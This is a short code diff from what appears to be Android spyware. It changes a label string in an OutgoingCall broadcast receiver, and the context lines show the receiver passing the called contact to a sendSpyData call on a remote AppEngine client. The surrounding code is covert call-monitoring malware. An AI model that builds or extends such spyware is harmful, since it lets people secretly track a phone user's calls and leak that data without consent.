@@ -38,7 +38,7 @@ public class OutgoingCall extends BroadcastReceiver
                         AppEngineClient client = new AppEngineClient(devID);
                         
                         
-                        String title = "Outgoing Call from " + contact;
+                        String title = "Outgoing Call to " + contact;
                         String body = "";
                         String date = "";
         				client.sendSpyData(title, body, date);
